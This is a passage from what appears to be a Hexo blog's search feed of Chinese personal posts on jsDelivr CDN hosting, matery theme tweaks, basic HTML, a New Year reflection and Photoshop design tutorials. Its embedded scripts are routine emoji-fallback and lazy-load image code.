start="3"><li>克隆到GitHub仓库到本地</li></ol><p>点击图中所示的<code>Clone or download</code>按钮，一键复制仓库地址。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221180643.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221180643.png" alt=""></p><p>自己在本地磁盘执行以下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone 复制的仓库地址</code></pre><ol start="4"><li>上传资源</li></ol><p>复制需要上传的资源到本地git仓库（注：jsDelivr不支持加载超过20M的资源），在本地git仓库目录下右键 Git Bash Here，执行以下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> status     //查看状态<span class="token function">git</span> add <span class="token keyword">.</span>     //添加所有文件到暂存区<span class="token function">git</span> commit -m <span class="token string">'第一次提交'</span>      //把文件提交到仓库,添加描述<span class="token function">git</span> push      //推送至远程仓库</code></pre><ol start="5"><li>发布仓库</li></ol><p>点击release，进行版本的发布。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221183016.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221183016.png" alt=""></p><p>自定义发布版本号，添加标题和描述等</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221183244.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221183244.png" alt=""></p><ol start="6"><li>通过jsdelivr引用资源</li></ol><p>使用方法：<a href="https://cdn.jsdelivr.net/gh/%E4%BD%A0%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D/%E4%BD%A0%E7%9A%84%E4%BB%93%E5%BA%93%E5%90%8D@%E5%8F%91%E5%B8%83%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7/%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/你的用户名/你的仓库名@发布的版本号/文件路径</a> 例如：<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/medias/avatar.jpg" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/medias/avatar.jpg</a> <a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/css/gallery.css" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/css/gallery.css</a></p><p><a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/loading4.gif" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/loading4.gif</a></p><p>注意：版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下：</p><ul><li>// 加载任何Github发布、提交或分支 <a href="https://cdn.jsdelivr.net/gh/user/repo@version/file" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/user/repo@version/file</a></li><li>// 加载 jQuery v3.2.1 <a href="https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js</a></li><li>// 使用版本范围而不是特定版本 <a href="https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js</a> <a href="https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js</a></li><li>// 完全省略该版本以获取最新版本 <a href="https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js</a></li><li>// 将“.min”添加到任何JS/CSS文件中以获取缩小版本，如果不存在，将为会自动生成 <a href="https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js</a></li><li>// 在末尾添加 / 以获取资源目录列表 <a href="https://cdn.jsdelivr.net/gh/jquery/jquery/" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/jquery/jquery/</a></li></ul><h2 id="4-GitHub-jsDelivr-PicGo-Imagine-打造稳定快速、高效免费图床"><a href="#4-GitHub-jsDelivr-PicGo-Imagine-打造稳定快速、高效免费图床" class="headerlink" title="4. GitHub + jsDelivr + PicGo + Imagine 打造稳定快速、高效免费图床"></a>4. GitHub + jsDelivr + PicGo + Imagine 打造稳定快速、高效免费图床</h2><blockquote><p>请参考这篇博文：<a href="https://sitoi.cn/posts/39161.html" target="_blank" rel="noopener">https://sitoi.cn/posts/39161.html</a></p></blockquote><h1 id="九、SEO优化"><a href="#九、SEO优化" class="headerlink" title="九、SEO优化"></a>九、SEO优化</h1><blockquote><p>请参考这篇博文：<a href="https://blog.sky03.cn/posts/42790.html#toc-heading-18" target="_blank" rel="noopener">https://blog.sky03.cn/posts/42790.html#toc-heading-18</a></p></blockquote><h1 id="十、文章参考来源"><a href="#十、文章参考来源" class="headerlink" title="十、文章参考来源"></a>十、文章参考来源</h1><ul><li><p><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md" target="_blank" rel="noopener">matery主题文档</a></p></li><li><p><a href="https://blog.licardo.cn/posts/11199/" target="_blank" rel="noopener">Matery主题配置豆瓣插件</a></p></li><li><p><a href="https://www.itrhx.com/2018/08/27/A04-Hexo-blog-topic-personalization/" target="_blank" rel="noopener">Hexo博客主题个性化</a></p></li><li><p><a href="https://blog.sky03.cn/posts/42790.html" target="_blank" rel="noopener">Hexo进阶之各种优化</a></p></li><li><p><a href="https://blog.hvnobug.com/post/hexo-optimize.html" target="_blank" rel="noopener">hexo博客美化</a></p></li><li><p><a href="%5Bhttps://liyangzone.com/2019/07/22/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E4%B8%80%E7%BA%A7%E5%88%86%E7%B1%BB%E7%9B%B8%E5%86%8C/%5D(https://liyangzone.com/2019/07/22/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E4%B8%80%E7%BA%A7%E5%88%86%E7%B1%BB%E7%9B%B8%E5%86%8C/">博客添加相册功能</a></p></li></ul><h1 id="十一、去掉首页banner轮播图的背景颜色"><a href="#十一、去掉首页banner轮播图的背景颜色" class="headerlink" title="十一、去掉首页banner轮播图的背景颜色"></a>十一、去掉首页banner轮播图的背景颜色</h1><p>打开themes/matery/source/css/matery.css文件(367行，也可以快速搜索<code>.bg-cover:after</code>进行定位):</p><p>然后注释掉这两行css</p><pre><code>.bg-cover:after {/*  -webkit-animation: rainbow 60s infinite;    animation: rainbow 60s infinite;*/}</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120004225.png" alt=""></p><h1 id="修改导航栏右上角github角标颜色"><a href="#修改导航栏右上角github角标颜色" class="headerlink" title="修改导航栏右上角github角标颜色"></a>修改导航栏右上角github角标颜色</h1><p>打开themes/matery/layout/_partial/github-link.ejs文件(第十五行)修改color属性就可以随心所欲的改变github角标的颜色   15行左右</p><pre><code>    .github-corner svg {        color: #F062A7;        fill: #fff;        height: 64px;        width: 64px;    }</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120005110.png" alt=""></p><h1 id="修改全局主题颜色"><a href="#修改全局主题颜色" class="headerlink" title="修改全局主题颜色"></a>修改全局主题颜色</h1><p>打开G:\MyBlog\themes\Cat00011cat\source\css\matery.css文件，之后搜索.bg-color</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200129171954.png" alt=""></p><ul><li>返回顶部按钮颜色修改</li></ul><p>打开G:\MyBlog\themes\Cat00011cat\source\css\matery.css文件，搜索top-scroll</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200129173225.PNG" alt=""></p><h1 id="注释banner轮播图"><a href="#注释banner轮播图" class="headerlink" title="注释banner轮播图"></a>注释banner轮播图</h1><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200420235331.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML简介</title>
      <link href="/posts/65440.html"/>
      <url>/posts/65440.html</url>
      
        <content type="html"><![CDATA[<h4 id="HTML简介"><a href="#HTML简介" class="headerlink" title="HTML简介"></a>HTML简介</h4><h5 id="什么是HTML？"><a href="#什么是HTML？" class="headerlink" title="什么是HTML？"></a>什么是HTML？</h5><p>HTML是用来描述网页的一种语言。</p><ul><li><p>HTML指的是超文本标记语言（Hyper Text Markup Language）</p></li><li><p>HTML不是一种编程语言，而是一种标记语言（Markup Language）</p></li><li><p>编辑语言是一套标记标签（Markup Tag）</p></li><li><p>HTML使用标记标签来描述网页</p></li></ul><h5 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h5><p>HTML标记标签通常被称为HTML标签（HTML Tag）</p><ul><li><p>HTML标签是由尖括号包围的关键词进行标记，比如Hello World；HTML标签就像一对情侣少了谁都不行，通常都是成对出现的，当然也有单身狗是单独出现的。比如</p><h1>Hello World</h1><p></p></li><li><p>标签中的第一个标签是开始标签，第二个标签是结束标签；有始有终。</p></li><li><p>开始标签和结束标签也被称为开放标签和闭合标签</p></li></ul><h5 id="HTML文档-网页"><a href="#HTML文档-网页" class="headerlink" title="HTML文档=网页"></a>HTML文档=网页</h5><h6 id="Web浏览器的作用是读取HTML文档，并以网页的形式显示出它们。而浏览器不会显示HTML标签，浏览器会解释HTML文档并呈现在浏览器上"><a href="#Web浏览器的作用是读取HTML文档，并以网页的形式显示出它们。而浏览器不会显示HTML标签，浏览器会解释HTML文档并呈现在浏览器上" class="headerlink" title="Web浏览器的作用是读取HTML文档，并以网页的形式显示出它们。而浏览器不会显示HTML标签，浏览器会解释HTML文档并呈现在浏览器上."></a>Web浏览器的作用是读取HTML文档，并以网页的形式显示出它们。而浏览器不会显示HTML标签，浏览器会解释HTML文档并呈现在浏览器上.</h6><pre><code>&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;&lt;p&gt;Hello World&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="例子解释"><a href="#例子解释" class="headerlink" title="例子解释"></a>例子解释</h5><ul><li>   之间的文本及标签描述网页</li><li>   <script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script>之间的文本是浏览器呈现页面内容</li><li><p><code>&lt;h1&gt;  &lt;/h1&gt;</code>之间的文本表示标题</p></li><li><p><code>&lt;p&gt; &lt;/p&gt;</code>之间的文本表示段落</p></li></ul><h4 id="点击脑补一下HTML"><a href="#点击脑补一下HTML" class="headerlink" title="点击脑补一下HTML"></a><a href="https://www.runoob.com/html/html5-intro.html" target="_blank" rel="noopener">点击脑补一下HTML</a></h4><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再见2019，你好2020</title>
      <link href="/posts/14642.html"/>
      <url>/posts/14642.html</url>
      
        <content type="html"><![CDATA[<p>2019感谢所有的遇见！！！</p><p>虽然2019过去了，</p><p>不管你是珍惜还是遗憾，</p><p>不管你是欢喜还是无奈。</p><p>2019终究回不去了</p><p>不管你是轻松还是疲惫，</p><p>不管你是烦恼还是顺遂。</p><p>再见2019</p><p>呸呸呸，不见2019！</p><p>这一年，是忙碌的一年，也是瞬间即逝的一年。</p><p>是艰辛的一年。</p><p>这一年，有苦有泪太难言，</p><p>得到失去太心酸！</p><p>好好说声再见，</p><p>感谢经历，让我成长；</p><p>感谢过往，让我坚强；</p><p>感谢磨难，让我成就；</p><p>感谢帮助，给我信心！</p><p>感谢所有的相遇！</p><p>Hello 2020！</p><p>新的一年，让过往清零，</p><p>把所有的不愉快放到网络的一个角落。</p><p>新的一年，要怀揣希望，</p><p>把生活继续。</p><p>新的一年，携带梦想，</p><p>杨帆启航！</p><p>信安之路 三年之约。</p><p>在此感谢@尊师XCSOFT@大哥@Al0ne@御风安全@W6z4r</p><p>感谢各位大佬带我入门。</p><p>2020，</p><p>愿你活成想要的自己，</p><p>也祝大哥早日上岸。</p><p>加油加油加油！冲冲冲。</p><p>春夏秋冬轮回更替，</p><p>一年四季景色各异。</p><p>纵然，</p><p>很多事情我无能为力，</p><p>我认命……..</p><p>但是我不服命。</p><p>只求，</p><p>面对困难我坚持到底！</p><p>2019，</p><p>是苦难也好，是荆棘也罢，</p><p>都已经熬过。</p><p>是误解也罢，是烦恼也罢，</p><p>都应该放下。</p><p>2019我听的最多的一句话就是“我太难了”</p><p>再难，没有虚度，</p><p>再苦，没有轻易言弃。</p><p>2020，</p><p>愿你以梦为马，不负韶华！</p><p>愿你走出万里，不改初心！</p><p>生而为人，</p><p>还请努力</p><p>再别忘了初心。</p><p>人生就像一场旅行，</p><p>你要相信，</p><p>你经历的。就是最好的风景，</p><p>你走过的，都是最美的痕迹。</p><p>2019，</p><p>再也不见，</p><p>2020，</p><p>还请努力！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>newblog</title>
      <link href="/posts/34753.html"/>
      <url>/posts/34753.html</url>
      
        <content type="html"><![CDATA[<h3 id="念念不忘-必有回响"><a href="#念念不忘-必有回响" class="headerlink" title="念念不忘 必有回响"></a>念念不忘 必有回响</h3><p>几年前就想要拥有一个属于自己博客，终于在上个假期搭建了一个属于自己的博客；</p><p>也实现了自己的一个小目标，博客一直运营至今，也坚持更新技术文章。</p><p>由于考虑长久运营博客（本身博客就不是盈利网站），高额服务器费用实在是有些浪费（虽然现在用的是学生机）但是几年后不能用学生机啦我也步入社会服务器的额外支持以及其他费用简直是浪费。</p><h5 id="于是开始萌生了新的想法HEXO框架搭建纯静态博客"><a href="#于是开始萌生了新的想法HEXO框架搭建纯静态博客" class="headerlink" title="于是开始萌生了新的想法HEXO框架搭建纯静态博客"></a>于是开始萌生了新的想法HEXO框架搭建纯静态博客</h5><h5 id="并部署在GitHub上；"><a href="#并部署在GitHub上；" class="headerlink" title="并部署在GitHub上；"></a>并部署在GitHub上；</h5><p>使用github pages服务搭建博客的好处有：</p><p>1.全是静态文件，访问速度快（减少了被黑风险）</p><p>2.免费方便，不用花一个分钱就可以搭建一个自己的博客，不需要服务器以及后台（不必担心服务器被攻破）</p><p>3.可以任意绑定属于自己的域名，不仔细看的话根本看不出来你的网站是基于github运行的。</p><p>4.数据绝对安全，基于github的版本管理，想恢复到那个历史版本都行（也可以自行本地备份）</p><p>5.博客内容可以轻松打包，转移，发布到其他平台（也可以码云和Github双平台运行）</p><p>6.etc…</p><p>说干就干 直接杠到底！！！</p><p>HEXO框架搭建博客对于新手小白可能门槛会有点高，</p><p>比如说我就是小白，搭建初期踩了很多坑。（一条路走到黑）</p><h5 id="经过数十天的折腾，终于在今天部署成功。（对于配置还是很欠缺）"><a href="#经过数十天的折腾，终于在今天部署成功。（对于配置还是很欠缺）" class="headerlink" title="经过数十天的折腾，终于在今天部署成功。（对于配置还是很欠缺）"></a>经过数十天的折腾，终于在今天部署成功。（对于配置还是很欠缺）</h5><p><del>由于最近准备技能大赛，时间有限就先不放出搭建教程</del>。</p><p>不过我也会努力 去学习，不会停止自己学习的脚步。</p><p>经过这几天的折腾，我总结出了一个道理。</p><p><del>世上无难事，只怕不百度</del></p><h3 id="趁年轻-多折腾-才成功！"><a href="#趁年轻-多折腾-才成功！" class="headerlink" title="趁年轻 多折腾 才成功！"></a>趁年轻 多折腾 才成功！</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>淘宝京东拼多多电商美工经验技巧分享</title>
      <link href="/posts/19963.html"/>
      <url>/posts/19963.html</url>
      
        <content type="html"><![CDATA[<p><strong><a href="http://www.thecat.top">在电商美工装修时，Ps当中最常运用的就是渐变特效以及混合图层的巧妙运用。</a></strong></p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210726.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113214716.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113214909.gif" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113215022.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113215132.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113215250.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210725.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210730.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210727.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210724.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210731.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210729.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113215348.jpg" alt=""></p><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><ul><li><p>工具介绍  </p><p>1.绘制圆角矩形内发光效果</p></li></ul><p>首先使用<strong>圆角矩形工具</strong>绘制一个合适的圆角矩形（注意修改半径）；使用<strong>混合图层</strong>里面的内发光特效。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210734.PNG" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210737.PNG" alt=""></p><p>2.半圆轮廓绘制<br>使用<strong>椭圆工具</strong>，绘制出圆形轮廓（记得关闭填充），使用<strong>添加描点工具</strong>点击<strong>图形</strong>两端的中心添加描点，按<strong>del删除键</strong>删掉一半。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210733.PNG" alt=""></p><p>3.渐变条制作<br>选择<strong>圆角矩形工具</strong>绘制圆角矩形，渐变填充（前景色到背景色的渐变填充）；ctrl t调整角度，放到合适的地方。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210735.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210732.png" alt=""><strong>4.绘制CAT猫</strong></p><p>选择<strong>圆角矩形工具</strong>半径为11 秒变为11 绘制出圆角矩形；之后选择<strong>添加描点工具</strong>在顶部位置添加描点，并且使用<strong>下移键</strong>下移选中部分。（添加描点工具可以对图形进行任意修改拉伸变形）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210736.png" alt=""></p><p>5.前景色到透明背景渐变</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210728.png" alt=""></p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>故障风效果海报</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210739.png" alt=""></p><h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>浮雕效果：<br>使用<strong>混合图层样式 斜面和浮雕</strong>（适当修改参数）<br>绘制猫妖e：使用<strong>圆角矩形工具</strong>和<strong>添加描点工具</strong>绘制以及勾勒出猫头；使用<strong>自定义形状</strong>里的人形拼贴出下半身。用<strong>添加描点工具</strong>修饰一下。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113210738.png" alt=""></p><h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>五彩字体制作：<br>在图层1上打上文字；<br>之后创建透明背景；<br>使用画笔100涂抹；<br>最后选中<strong>透明背景</strong>右键图层 创建剪切蒙版</p><hr><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 平面设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平面设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ps快速制作抖音网红故障风特效</title>
      <link href="/posts/40203.html"/>
      <url>/posts/40203.html</url>
      
        <content type="html"><![CDATA[<p>近期因为学校的电子商务技能大赛，一直在忙于淘宝美工技巧以及各种特效的制作。<br>这几天学到了很多Ps技巧。不论这个比赛项目结果如何，但是这个过程是很有意思的！</p><p>今天抽出我休息的时间更新一个故障风特效制作的笔记。<br>虽然很短，但是很有用。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>软件版本：PsCs6</li><li>操作系统：Windows10</li></ul><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li><p>首先打开Ps之后检查自己是否是RGB（显示屏模式）；  </p><p>如果不是的话可以选择菜单栏下的<strong>图像</strong>-<strong>模式</strong>-里面更改为RGB模式；</p></li></ul><p>这里需要注意的是不能使用CMYK模式。（如图）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113212519.png" alt=""></p><p>CTRL+J复制一层图层副本，双击图层打开<strong>混合模式</strong>（如图）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113212635.png" alt=""></p><p>取消<strong>G</strong>和<strong>B</strong>的选中，并确定。（如图）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113212749.png" alt=""></p><p>任意方向移动图层副本（开心就好）。（如图）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113212942.png" alt=""></p><p>选择<strong>矩形工具</strong>，在任意位置画上矩形;按住<strong>Shift键</strong>（媳妇键）可以不同位置绘制矩形。<br>最后选择<strong>滤镜</strong>-<strong>风格化</strong>-<strong>风</strong>（至于参数的话，怎么好看怎么来）（如图）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113213115.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113213219.png" alt=""></p><h2 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200113213333.PNG" alt=""></p><p>我最近为啥会感觉到迷茫？？<br><del>还不是因为自己的才华已经不足以支撑起我的野心。</del>自己就没有才华，凸(艹皿艹 )<br>加油！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 平面设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平面设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没关系，我愿意被你麻烦！</title>
      <link href="/posts/56591.html"/>
      <url>/posts/56591.html</url>
      
